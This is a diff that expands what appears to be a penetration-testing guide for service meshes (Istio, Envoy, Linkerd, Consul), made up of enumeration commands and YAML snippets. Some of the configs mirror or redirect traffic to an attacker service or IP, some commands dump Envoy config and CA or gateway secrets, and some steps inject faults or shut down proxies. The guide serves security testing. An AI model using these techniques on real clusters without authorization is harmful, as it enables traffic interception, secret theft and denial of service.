@@ -1,43 +1,574 @@
 <service_mesh_security_guide>
 <title>SERVICE MESH SECURITY TESTING</title>
 
-<critical>Service mesh security testing covers Istio/Envoy vulnerabilities, mTLS bypass, authorization policy bypass, sidecar injection attacks, and control plane exploitation.</critical>
+<critical>Service meshes like Istio, Linkerd, and Consul Connect provide critical infrastructure for microservices security through mTLS, authorization policies, and traffic management. However, misconfigurations in PeerAuthentication, AuthorizationPolicies, or sidecar injection can completely bypass security controls. Control plane compromise enables cluster-wide traffic interception. Sidecar proxy vulnerabilities (Envoy CVEs) can lead to remote code execution. Most organizations deploy service meshes without understanding the security implications of permissive modes.</critical>
 
 <scope>
-- Istio security testing
-- Envoy proxy exploitation
-- mTLS bypass techniques
-- Sidecar injection attacks
-- Authorization policy bypass
-- Traffic interception
-- Control plane attacks
+- Istio security architecture and misconfigurations
+- Envoy proxy exploitation and CVEs
+- mTLS bypass through permissive modes
+- Sidecar injection attacks and bypass
+- AuthorizationPolicy bypass techniques
+- PeerAuthentication weaknesses
+- Traffic interception and manipulation
+- Control plane (istiod) exploitation
+- Ingress/Egress gateway attacks
+- Linkerd security testing
+- Consul Connect security testing
+- Service entry and destination rule abuse
+- VirtualService routing manipulation
+- Telemetry and observability data exposure
 </scope>
 
-<mtls_testing>
+<methodology>
+1. Enumerate service mesh type and version (Istio, Linkerd, Consul).
+2. Map security policies (PeerAuthentication, AuthorizationPolicy).
+3. Identify namespaces with sidecar injection enabled/disabled.
+4. Test mTLS enforcement between services.
+5. Attempt authorization policy bypass through various techniques.
+6. Check for direct pod access bypassing sidecars.
+7. Enumerate control plane exposure and authentication.
+8. Test ingress/egress gateway configurations.
+9. Analyze VirtualService and DestinationRule for manipulation opportunities.
+</methodology>
+
+<testing_techniques>
+<istio_security_testing>
 {% raw %}
-# mTLS bypass:
-# Check if mTLS enforced:
-kubectl get peerauthentication -n namespace
+# Istio Security Architecture Enumeration
 
-# Test without client cert:
-curl http://service.namespace.svc.cluster.local:8080
+# 1. Identify Istio version and components
+kubectl get pods -n istio-system
+kubectl get deployment istiod -n istio-system -o yaml | grep image:
+istioctl version
 
-# Sidecar bypass:
-# Direct pod IP access bypasses sidecar
-curl http://10.244.1.5:8080
+# 2. Check Istio configuration profile
+kubectl get configmap istio -n istio-system -o yaml
+
+# 3. Enumerate all Istio CRDs in use
+kubectl get virtualservices,destinationrules,gateways,serviceentries -A
+kubectl get peerauthentications,authorizationpolicies,requestauthentications -A
+
+# 4. Check mesh-wide mTLS mode
+kubectl get peerauthentication -n istio-system
+# STRICT = enforced, PERMISSIVE = optional (vulnerable)
+
+# 5. Check namespace-level injection
+kubectl get namespace -L istio-injection
+# istio-injection=enabled means sidecar auto-injected
+
+# 6. Find pods without sidecars (bypass opportunities)
+kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name} {.spec.containers[*].name}{"\n"}{end}' | grep -v istio-proxy
+
+# 7. Check Istio CNI vs iptables mode
+kubectl get daemonset istio-cni-node -n istio-system
+# CNI mode has different bypass vectors than iptables
 {% endraw %}
-</mtls_testing>
+</istio_security_testing>
 
-<authorization_bypass>
+<mtls_bypass_techniques>
 {% raw %}
-# Authorization policy testing:
-# Check policies:
-kubectl get authorizationpolicies -A
+# mTLS Bypass Testing
 
-# Test unauthorized access:
-curl -H "Authorization: Bearer invalid" http://service/admin
+# 1. Check PeerAuthentication modes
+kubectl get peerauthentication -A -o yaml
+
+# Vulnerable configurations:
+# mtls:
+#   mode: PERMISSIVE  # Accepts both plain and mTLS (DANGEROUS)
+#   mode: DISABLE     # No mTLS at all
+
+# 2. Test PERMISSIVE mode bypass
+# From a pod without sidecar, access mTLS service:
+kubectl exec -it pod-without-sidecar -- curl http://target-service:8080
+
+# 3. Port-level PERMISSIVE bypass
+# Some ports may be excluded from mTLS:
+spec:
+  portLevelMtls:
+    8080:
+      mode: DISABLE  # This port accepts plaintext
+
+# Test specific port:
+curl http://target-service:8080  # May work without mTLS
+
+# 4. Direct Pod IP bypass
+# Sidecars intercept service DNS, not direct IP:
+TARGET_POD_IP=$(kubectl get pod target-pod -o jsonpath='{.status.podIP}')
+curl http://$TARGET_POD_IP:8080  # Bypasses sidecar interception
+
+# 5. Headless service bypass
+# Headless services resolve to pod IPs directly:
+kubectl get svc -o yaml | grep clusterIP: None
+
+# 6. Init container race condition
+# During pod startup, brief window before sidecar ready:
+# Extremely fast requests during deployment may bypass
+
+# 7. DestinationRule TLS mode override
+kubectl get destinationrule -A -o yaml | grep -A5 tls:
+# trafficPolicy:
+#   tls:
+#     mode: DISABLE  # Overrides mTLS for this destination
+
+# 8. ServiceEntry external bypass
+# External services may not require mTLS:
+kubectl get serviceentry -A -o yaml
 {% endraw %}
-</authorization_bypass>
+</mtls_bypass_techniques>
 
-<remember>Service mesh security: Test mTLS enforcement, check authorization policies, attempt sidecar bypass via direct pod access, validate control plane security.</remember>
+<authorization_policy_bypass>
+{% raw %}
+# AuthorizationPolicy Bypass Techniques
+
+# 1. Enumerate all authorization policies
+kubectl get authorizationpolicies -A -o yaml
+
+# 2. Check for ALLOW-all policies
+# Vulnerable pattern:
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+spec:
+  rules:
+  - {}  # Empty rule = ALLOW ALL
+
+# 3. Check for missing policies (default ALLOW)
+# If no policy exists for a workload, traffic is allowed
+
+# 4. Namespace-level bypass
+# Policy in wrong namespace doesn't apply:
+kubectl get authorizationpolicy -n istio-system  # Root namespace
+kubectl get authorizationpolicy -n target-namespace
+
+# 5. Source principal bypass
+# If policy checks source.principal:
+# from:
+# - source:
+#     principals: ["cluster.local/ns/app/sa/frontend"]
+#
+# Test with different service account:
+kubectl create serviceaccount attacker -n target-namespace
+# Run pod with that SA and test access
+
+# 6. Header-based authorization bypass
+# to:
+# - operation:
+#     methods: ["GET"]
+#     paths: ["/api/*"]
+#     when:
+#     - key: request.headers[x-role]
+#       values: ["admin"]
+#
+# Test header injection:
+curl -H "x-role: admin" http://target-service/api/admin
+
+# 7. Path normalization bypass
+# Test path variations:
+curl http://target-service/api/admin
+curl http://target-service/api//admin
+curl http://target-service/api/./admin
+curl http://target-service/api/foo/../admin
+curl http://target-service/API/ADMIN  # Case sensitivity
+
+# 8. Method override bypass
+curl -X POST http://target-service/api \
+  -H "X-HTTP-Method-Override: DELETE"
+
+# 9. CUSTOM action bypass
+# External authorization may have different vulnerabilities:
+kubectl get authorizationpolicy -A -o yaml | grep -A10 "action: CUSTOM"
+{% endraw %}
+</authorization_policy_bypass>
+
+<sidecar_injection_attacks>
+{% raw %}
+# Sidecar Injection Testing
+
+# 1. Check injection configuration
+kubectl get mutatingwebhookconfiguration istio-sidecar-injector -o yaml
+
+# 2. Namespaces that bypass injection
+# Check for injection disabled:
+kubectl get namespace -L istio-injection
+# istio-injection=disabled or no label = no sidecar
+
+# 3. Pod-level injection override
+# Pods can opt-out:
+metadata:
+  annotations:
+    sidecar.istio.io/inject: "false"
+
+# Find pods with injection disabled:
+kubectl get pods -A -o json | jq '.items[] | select(.metadata.annotations["sidecar.istio.io/inject"]=="false") | .metadata.name'
+
+# 4. Host network pods bypass injection
+# hostNetwork: true pods don't get sidecars:
+kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork==true) | .metadata.namespace + "/" + .metadata.name'
+
+# 5. Init container bypass
+# Sidecar uses init container for iptables rules
+# If init container fails/skips, traffic isn't redirected
+
+# 6. Port exclusion bypass
+# Certain ports excluded from interception:
+traffic.sidecar.istio.io/excludeInboundPorts: "22,3306"
+traffic.sidecar.istio.io/excludeOutboundPorts: "443"
+
+# Find excluded ports:
+kubectl get pods -A -o json | jq '.items[] | select(.metadata.annotations["traffic.sidecar.istio.io/excludeInboundPorts"]!=null)'
+
+# 7. Injection webhook bypass
+# If webhook is down, pods deploy without sidecars
+# Check webhook health:
+kubectl get mutatingwebhookconfiguration istio-sidecar-injector -o yaml | grep failurePolicy
+# failurePolicy: Ignore = bypass if webhook down
+
+# 8. UID bypass
+# Istio excludes certain UIDs from interception:
+kubectl get configmap istio-sidecar-injector -n istio-system -o yaml | grep -i uid
+{% endraw %}
+</sidecar_injection_attacks>
+
+<envoy_proxy_exploitation>
+{% raw %}
+# Envoy Proxy Security Testing
+
+# 1. Check Envoy version
+kubectl exec -it target-pod -c istio-proxy -- pilot-agent version
+
+# 2. Access Envoy admin interface
+# Admin interface is bound to localhost:15000
+kubectl exec -it target-pod -c istio-proxy -- curl localhost:15000
+
+# 3. Envoy admin endpoints:
+/config_dump    # Full configuration (may contain secrets)
+/clusters       # Upstream cluster info
+/listeners      # Listener configuration
+/stats          # Metrics (information disclosure)
+/logging        # Change log levels (post-exploitation)
+/quitquitquit   # Shutdown Envoy (DoS)
+
+# 4. Extract Envoy config (secrets included):
+kubectl exec target-pod -c istio-proxy -- curl -s localhost:15000/config_dump | jq '.configs[] | select(.["@type"] | contains("secrets"))'
+
+# 5. Known Envoy CVEs to test:
+# CVE-2022-21654 - Incorrect handling of HTTP/2
+# CVE-2021-32777 - ext_authz bypass
+# CVE-2021-29258 - Crash on HTTP2 flood
+# CVE-2020-8663 - Resource exhaustion
+
+# 6. Envoy filter chain bypass
+# Check for filter ordering issues:
+kubectl exec target-pod -c istio-proxy -- curl -s localhost:15000/config_dump | jq '.configs[] | select(.["@type"] | contains("listeners"))'
+
+# 7. Request smuggling through Envoy
+# HTTP/1.1 vs HTTP/2 parsing differences
+# Test content-length vs transfer-encoding
+
+# 8. Memory exhaustion
+# Large headers, many connections, slow loris
+{% endraw %}
+</envoy_proxy_exploitation>
+
+<control_plane_attacks>
+{% raw %}
+# Istio Control Plane (istiod) Security Testing
+
+# 1. Check istiod exposure
+kubectl get svc istiod -n istio-system
+# ClusterIP = internal, LoadBalancer/NodePort = exposed
+
+# 2. Check xDS API authentication
+# Workloads authenticate to istiod via SPIFFE
+# Test if unauthenticated access possible:
+kubectl port-forward svc/istiod -n istio-system 15010:15010
+grpcurl -plaintext localhost:15010 list
+
+# 3. Pilot debug endpoints
+kubectl exec -it istiod-xxx -n istio-system -- curl localhost:15014/debug/configz
+kubectl exec -it istiod-xxx -n istio-system -- curl localhost:15014/debug/endpointz
+kubectl exec -it istiod-xxx -n istio-system -- curl localhost:15014/debug/authorizationz
+
+# 4. Check webhook authentication
+kubectl get validatingwebhookconfiguration
+kubectl get mutatingwebhookconfiguration
+
+# 5. istiod RBAC permissions
+kubectl auth can-i --list --as=system:serviceaccount:istio-system:istiod
+# istiod has powerful cluster-wide permissions
+
+# 6. Certificate authority access
+# istiod is the mesh CA
+# Check if CA certs/keys accessible:
+kubectl get secret istio-ca-secret -n istio-system -o yaml
+
+# 7. Check for exposed Prometheus/Grafana
+kubectl get svc -n istio-system | grep -E "prometheus|grafana|kiali"
+# May expose sensitive mesh telemetry
+
+# 8. Kiali dashboard access
+kubectl port-forward svc/kiali -n istio-system 20001:20001
+# Check for default credentials or no auth
+{% endraw %}
+</control_plane_attacks>
+
+<traffic_interception>
+{% raw %}
+# Traffic Interception and Manipulation
+
+# 1. VirtualService routing manipulation
+# If you can modify VirtualService, redirect traffic:
+apiVersion: networking.istio.io/v1beta1
+kind: VirtualService
+spec:
+  http:
+  - match:
+    - uri:
+        prefix: /sensitive
+    route:
+    - destination:
+        host: attacker-service
+
+# 2. Traffic mirroring for eavesdropping
+spec:
+  http:
+  - route:
+    - destination:
+        host: target-service
+    mirror:
+      host: attacker-service
+    mirrorPercentage:
+      value: 100.0
+
+# 3. Header injection via VirtualService
+spec:
+  http:
+  - headers:
+      request:
+        add:
+          x-injected: "malicious"
+
+# 4. Fault injection for DoS
+spec:
+  http:
+  - fault:
+      delay:
+        percentage:
+          value: 100.0
+        fixedDelay: 30s
+      abort:
+        percentage:
+          value: 50.0
+        httpStatus: 500
+
+# 5. ServiceEntry for external hijacking
+# Redirect external traffic to attacker:
+apiVersion: networking.istio.io/v1beta1
+kind: ServiceEntry
+spec:
+  hosts:
+  - api.legitimate-service.com
+  addresses:
+  - 1.2.3.4  # Attacker IP
+  resolution: STATIC
+
+# 6. EnvoyFilter for deep manipulation
+# Raw Envoy config injection:
+apiVersion: networking.istio.io/v1alpha3
+kind: EnvoyFilter
+spec:
+  configPatches:
+  - applyTo: HTTP_FILTER
+    patch:
+      operation: INSERT_BEFORE
+      value:
+        name: envoy.filters.http.lua
+        typed_config:
+          "@type": type.googleapis.com/envoy.extensions.filters.http.lua.v3.Lua
+          inlineCode: |
+            -- Attacker's Lua code here
+{% endraw %}
+</traffic_interception>
+
+<ingress_egress_testing>
+{% raw %}
+# Ingress/Egress Gateway Security Testing
+
+# 1. Enumerate gateways
+kubectl get gateways -A -o yaml
+kubectl get pods -n istio-system -l istio=ingressgateway
+
+# 2. Check gateway TLS configuration
+# Weak TLS or missing mTLS:
+spec:
+  servers:
+  - port:
+      number: 443
+      protocol: HTTPS
+    tls:
+      mode: SIMPLE  # Server-side TLS only (no client cert)
+      # MUTUAL = mTLS (more secure)
+
+# 3. Test gateway without TLS
+# HTTP gateway allows plaintext:
+spec:
+  servers:
+  - port:
+      number: 80
+      protocol: HTTP
+
+# 4. Wildcard host bypass
+spec:
+  servers:
+  - hosts:
+    - "*"  # Accepts any host header
+
+# Test with arbitrary host:
+curl -H "Host: anything.example.com" http://gateway-ip/
+
+# 5. Egress gateway bypass
+# Check if egress is enforced:
+kubectl get sidecar -A -o yaml | grep -A5 outboundTrafficPolicy
+# REGISTRY_ONLY = must use ServiceEntry
+# ALLOW_ANY = direct external access allowed
+
+# 6. Direct external access test
+kubectl exec -it app-pod -- curl https://external-service.com
+# If works, egress not restricted
+
+# 7. DNS-based egress bypass
+# Even with REGISTRY_ONLY, DNS may resolve
+kubectl exec -it app-pod -- nslookup malicious.com
+
+# 8. Gateway credential exposure
+kubectl get secret -n istio-system | grep gateway
+kubectl get secret gateway-cert -n istio-system -o yaml
+{% endraw %}
+</ingress_egress_testing>
+
+<linkerd_security>
+{% raw %}
+# Linkerd Service Mesh Security Testing
+
+# 1. Identify Linkerd installation
+kubectl get pods -n linkerd
+kubectl get deployment linkerd-controller -n linkerd -o yaml
+
+# 2. Check Linkerd version
+linkerd version
+
+# 3. mTLS status in Linkerd
+linkerd viz edges deployment  # Shows mTLS status
+
+# 4. Check for meshed vs unmeshed pods
+kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name} {.spec.containers[*].name}{"\n"}{end}' | grep -v linkerd-proxy
+
+# 5. Linkerd authorization policies (newer versions)
+kubectl get serverauthorizations -A
+kubectl get authorizationpolicies -A  # Linkerd 2.12+
+
+# 6. Server resources
+kubectl get servers -A -o yaml
+# Defines which ports are meshed
+
+# 7. Linkerd identity bypass
+# If trust anchor compromised, can mint arbitrary certs
+kubectl get secret linkerd-identity-issuer -n linkerd -o yaml
+
+# 8. Linkerd tap access (traffic inspection)
+linkerd viz tap deployment/target  # Requires RBAC
+
+# 9. Check ServiceProfile for routes
+kubectl get serviceprofiles -A
+{% endraw %}
+</linkerd_security>
+
+<consul_connect_security>
+{% raw %}
+# Consul Connect Service Mesh Testing
+
+# 1. Identify Consul installation
+kubectl get pods -n consul
+consul version
+
+# 2. Check Consul ACL status
+consul acl bootstrap  # If this works, ACLs not enabled!
+consul acl token list  # Enumerate tokens
+
+# 3. Consul intentions (authorization)
+consul intention list
+consul intention check source destination
+
+# 4. Test intention bypass
+# Create allow intention if you have ACL token:
+consul intention create -allow source destination
+
+# 5. Connect CA access
+consul connect ca get-config
+consul connect ca set-config  # If works, can modify CA
+
+# 6. Service identity tokens
+consul acl token list | grep -i service
+# Service tokens may have excessive permissions
+
+# 7. Consul KV secrets
+consul kv get -recurse  # May contain secrets
+
+# 8. Consul Connect proxy bypass
+# Direct pod access without proxy:
+curl http://pod-ip:8080
+
+# 9. Check TLS configuration
+consul tls ca  # View CA cert
+consul connect proxy -sidecar-for service  # Debug proxy
+{% endraw %}
+</consul_connect_security>
+</testing_techniques>
+
+<validation>
+1. Confirm mTLS bypass by successfully accessing service without client certificate.
+2. Verify authorization bypass by accessing protected endpoints without proper identity.
+3. Test sidecar bypass by directly accessing pod IPs from unmeshed workloads.
+4. Confirm traffic interception by observing modified responses or mirrored traffic.
+5. Validate control plane access by querying debug endpoints or config APIs.
+6. Test gateway bypass by accessing services through unprotected paths.
+7. Verify policy gaps by mapping allowed vs blocked requests across different scenarios.
+</validation>
+
+<false_positives>
+- PERMISSIVE mode intentionally during migration (temporary state)
+- Direct pod access blocked by NetworkPolicy (defense in depth)
+- AuthorizationPolicy bypass blocked by application-level auth
+- Sidecar missing but service not exposed externally
+- Control plane debug endpoints blocked by network policy
+- Test environment has different policies than production
+- Gateway exposed but only to internal load balancer
+- mTLS "bypass" working only for health check endpoints
+</false_positives>
+
+<impact>
+- Complete bypass of zero-trust network security model
+- Credential theft through traffic interception
+- Lateral movement between services without authorization
+- Data exfiltration via modified egress routing
+- Denial of service through fault injection
+- Cluster-wide compromise via control plane exploitation
+- Man-in-the-middle attacks through certificate authority compromise
+- Persistent access through malicious VirtualService/EnvoyFilter
+</impact>
+
+<pro_tips>
+1. Check for PERMISSIVE mode first - it's the most common mTLS bypass.
+2. Pods without sidecars are your best friends - they bypass all mesh security.
+3. Envoy admin interface (15000) often contains secrets in config dumps.
+4. Host network pods never get sidecar injection - look for them.
+5. VirtualService + EnvoyFilter = complete traffic control if you can create them.
+6. Linkerd and Istio have very different policy models - know which you're testing.
+7. ServiceEntry can hijack external DNS - powerful for exfiltration or MITM.
+8. Control plane RBAC (who can create mesh resources) is often overlooked.
+9. Debug endpoints on istiod reveal full mesh configuration including secrets.
+10. Mesh observability (Kiali, Jaeger) often has weak auth and reveals architecture.
+</pro_tips>
+
+<remember>Service meshes provide security through sidecars, mTLS, and policies - all of which can be misconfigured or bypassed. PERMISSIVE mTLS mode and missing AuthorizationPolicies are the most common issues. Direct pod access bypasses sidecars entirely. Control plane compromise enables cluster-wide traffic manipulation. Always test both the data plane (sidecars) and control plane (istiod) security.</remember>
 </service_mesh_security_guide>
